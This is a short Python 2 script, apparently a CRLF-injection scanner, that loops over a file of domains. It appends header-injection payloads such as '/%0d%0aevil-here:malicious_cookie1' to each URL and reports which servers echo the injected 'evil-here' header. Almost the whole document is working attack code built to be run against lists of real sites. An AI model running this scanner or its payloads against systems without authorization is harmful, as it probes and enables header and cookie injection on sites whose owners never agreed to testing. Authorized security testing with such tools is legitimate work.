import sys,time,os,requests

class colors:
        def __init__(self):
                self.green = "\033[92m"
                self.blue = "\033[94m"
                self.bold = "\033[1m"
                self.yellow = "\033[93m"
                self.red = "\033[91m"
                self.end = "\033[0m"
rudcol = colors()

if os.name == 'nt':
	os.system('cls')
else:
	os.system('clear')

def usage():
	print ''
	print 'Use $ python ', sys.argv[0],' domain_list.ext crlf_payload'
	print 'e.g $ python crlf.py mail.ru.list /%0aevil-here:malicious_cookie1'

print '''
		########################################
		#   CRLF Injection                     #
		#     By Rudra Sarkar                  #
		#       twitter.com/rudr4_sarkar       #
		########################################
	  '''
print 'Payload1 =' + rudcol.red +' /%0aevil-here:malicious_cookie1' + rudcol.end
print 'Payload2 =' + rudcol.red +' /%0d%0aevil-here:malicious_cookie1' + rudcol.end
print ''

if len(sys.argv) <= 2:
		usage()
		sys.exit(0)
else:
	file = sys.argv[1]
	payload = sys.argv[2]

with open(file) as f:
	print rudcol.yellow + '[+] Scanning Start For CRLF Injection' + rudcol.end
	time.sleep(3)
	for line in f:
		try:
			line2 = line.strip()
			data = 'http://' + line2 + payload
			response = requests.get(data)

			try:
				time.sleep(2)
				print ''
				print 'c- URL: ',data
				print '|'
				print '|- Status: ', response.status_code
				print '|'
				print 'c- evil-here: ',response.headers['evil-here']
				print ''
			except:
				print rudcol.bold + rudcol.red + '[!] Not vulnerable !!!!' + rudcol.end
		except:
			time.sleep(2)
			print ''
			print 'c- URL: ',data
			print '|'
			print '|- Status: ' + rudcol.bold + rudcol.red + ' [!] Website offline' + rudcol.end
			print '|'
			print 'c- ' + rudcol.bold + rudcol.red + 'quiting..' + rudcol.end

# End